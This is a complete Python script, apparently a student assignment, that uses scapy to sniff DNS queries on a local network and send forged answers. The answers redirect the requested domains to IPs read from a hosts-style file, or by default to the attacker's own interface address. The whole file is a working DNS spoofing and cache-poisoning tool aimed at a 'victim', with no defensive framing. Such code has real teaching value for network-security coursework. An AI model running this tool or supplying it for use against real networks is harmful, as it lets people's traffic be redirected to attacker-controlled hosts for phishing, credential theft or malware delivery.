#!/usr/bin/python3
from scapy.all import *
import sys
import argparse
import socket
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNSQR, DNS, DNSRR
import netifaces

# AUTHOR : Shalaka Sidmul [111367731]
ip_domain_mapping = {}
ip_of_network_interface = '127.0.0.1'


def spoof_dns_response(pkt):
    global ip_of_network_interface, ip_domain_mapping
    spoofed_ip = None

    # strip the dot at the end of domain name and decode the bytes
    domain_name_req = pkt[DNSQR].qname[:-1].decode('utf-8')

    if pkt.dport == 53 and UDP in pkt and DNSRR not in pkt:
        if len(ip_domain_mapping) > 0:
            # check if mapping for it is present in host file supplied
            if ip_domain_mapping and domain_name_req in ip_domain_mapping:
                spoofed_ip = ip_domain_mapping[domain_name_req]
            else:
                print('Not spoofing for '+ domain_name_req + '\n')
                return
        elif len(ip_domain_mapping) == 0:
            spoofed_ip = ip_of_network_interface

        print('Spoofing: ' + domain_name_req + '  ' + spoofed_ip + '\n')
        #build spoof response
        spoof_response = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
                      / UDP(dport=pkt[UDP].sport, sport=53) \
                      / DNS(id=pkt[DNS].id,qr=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNS].qd.qname,rdata=spoofed_ip))
        # send response to victim
        send(spoof_response)
            # s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            # sent = s.sendto(str(spoofed_pkt), (pkt[IP].src, pkt[UDP].sport))
            # if sent < 1:
            #     print('Error in sending spoofed response')
            # else:
            #     print('Response spoofed successfully')

def main():
    global ip_of_network_interface, ip_domain_mapping
    # Reference: https://docs.python.org/2/library/argparse.html
    # specifying command line arguments
    command_line_argument_parser = argparse.ArgumentParser(description='DNS cache poisoning', add_help= False)
    # interface to listen on
    command_line_argument_parser.add_argument('-i', type=str, required=False, default=None)
    # file containing domain names and IPs to spoof
    command_line_argument_parser.add_argument('-h', type=str, required=False, default=None)
    # BPF filter for capturing packets that satisfy the filter
    command_line_argument_parser.add_argument('filter', nargs='?' ,type=str, default=None)

    # Capturing the arguments
    args = command_line_argument_parser.parse_args()
    print(args)

    if args.h is not None:
        file_handle = open(args.h, 'r')
        for line in file_handle:
            line = line.split()
            if len(line) != 2:
                continue
            ip_domain_mapping[line[1].strip()] = line[0].strip()
        file_handle.close()
        print(ip_domain_mapping)

    # initialize bpf filter for sniffing
    exp = None
    if args.filter:
        exp = "udp dst port 53 and " + args.filter
    else:
        exp = "udp dst port 53"

    # initialize the ip of network interface if spoofing for all packets
    if args.i is None:
        default_network_interface = conf.iface
        ip_of_network_interface = netifaces.ifaddresses(default_network_interface)[2][0]['addr']
        # start sniffing for packets with DNSQR layer (DNSQR: Domain Name Server Query Record)
        print('Sniffing on default interface: ', default_network_interface)
        sniff(filter=exp, iface=default_network_interface, prn=spoof_dns_response, lfilter=lambda x: x.haslayer(DNSQR))
    else:
        ip_of_network_interface = netifaces.ifaddresses(args.i)[2][0]['addr']
        # start sniffing for packets with DNSQR layer (DNSQR: Domain Name Server Query Record)
        print('Sniffing on interface: ', args.i)
        sniff(filter=exp, iface=args.i, prn=spoof_dns_response, lfilter=lambda x: x.haslayer(DNSQR))


#defining the entry point to code execution
if __name__ == "__main__":
    main()